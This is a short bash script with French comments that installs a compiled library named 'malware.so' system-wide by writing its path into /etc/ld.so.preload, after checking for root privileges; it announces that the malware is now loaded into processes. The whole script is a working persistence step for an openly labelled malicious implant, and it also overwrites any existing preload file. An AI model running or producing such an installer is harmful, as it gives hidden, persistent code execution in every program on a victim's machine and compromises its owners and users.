#!/bin/bash

# Chemin vers le .so compilé (à adapter si nécessaire)
MALWARE_SO="malware.so"

# Vérifie que le fichier existe
if [ ! -f "$MALWARE_SO" ]; then
    echo "❌ Erreur : $MALWARE_SO introuvable. Compile d'abord avec make."
    exit 1
fi

# Résout le chemin absolu
FULL_PATH=$(realpath "$MALWARE_SO")

# Vérifie que le script est exécuté avec sudo
if [ "$EUID" -ne 0 ]; then
    echo "❗ Ce script doit être lancé avec sudo"
    echo "Exemple : sudo ./add_to_ldso.sh"
    exit 1
fi

# Ajoute au fichier /etc/ld.so.preload
echo "[*] Ajout de $FULL_PATH à /etc/ld.so.preload"
echo "$FULL_PATH" > /etc/ld.so.preload

echo "[✓] Le malware est maintenant chargé via LD_PRELOAD"

